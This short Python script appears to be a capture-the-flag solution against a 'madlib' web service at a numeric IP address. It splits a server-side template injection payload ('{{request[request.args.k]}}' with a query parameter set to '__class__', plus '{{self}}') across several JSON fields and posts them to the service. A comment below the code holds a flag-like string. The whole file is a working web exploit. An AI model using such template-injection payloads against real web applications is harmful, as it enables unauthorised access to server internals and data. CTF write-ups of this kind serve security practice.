import requests

url = 'http://193.57.159.27:33844/madlib'

json = {
    'verb': 'VERB',
    'noun': 'NOUN',
    'adjective': '{{request[request',
    'person': 'args.k]}}',
    'place': '{{self}}'
}
params = {
    'kek': '__class__'
}
print(*[len(json[k]) for k in json.keys()])

r = requests.post(url, json=json, params=params)
print(r.status_code)
print(r.text)

'''
docchessiscool)

'''